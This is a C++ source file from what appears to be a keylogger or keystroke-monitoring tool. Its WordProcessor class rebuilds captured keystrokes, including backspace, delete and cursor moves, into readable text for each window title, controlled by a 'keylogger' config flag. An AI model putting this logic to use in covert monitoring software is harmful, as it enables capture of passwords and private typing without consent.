#include "WordProcessor.h"
#include <Poco/Util/PropertyFileConfiguration.h>

WordProcessor::WordProcessor(IGuardProcessor* processor): processor(processor) {
    editfeature = AppContainer::instance().config()->getBool("application.keylogger.editfeatures", false);
    //editfeature = Poco::Util::ConfigurationMapper:: Application::instance().config().getBool("application.keylogger.editfeatures", false);
}

void WordProcessor::process(/*Poco::Util::Application* _app,*/ HWND window, std::wstring str) {
    //app = _app;
    const int MAX_TITLE_LENGTH = 1024;
    wchar_t title[MAX_TITLE_LENGTH];
    int length = GetWindowTextW(window, title, MAX_TITLE_LENGTH);

    std::wstring wTitle(title);
    Poco::SharedPtr<WindowInfo> sp1(new WindowInfo(/*app,*/wTitle, processor));
    Poco::SharedPtr<WindowInfo> sp2(sp1);

    if (mapWindows.find(window) == mapWindows.end()) {
        mapWindows.insert(Mymap::value_type(window, sp2));
    } 

    /*
    * Если в конфиге задан параметр application.keylogger.editfeatures: true
    * то разрешаем удаление, перемещение по тексту с буфером
    */
    if (str == L"[BACKSPACE]")mapWindows.at(window)->removeChar(-1);
    else if ((str == L"[DELETE]") && editfeature )mapWindows.at(window)->removeChar(1);
    else if (str == L"[LEFT]" && editfeature)mapWindows.at(window)->moveLeft();
    else if (str == L"[RIGHT]" && editfeature)mapWindows.at(window)->moveRight();
    else
        mapWindows.at(window)->addChar(str);
}

int WordProcessor::countWindow() {
    return mapWindows.size();
}
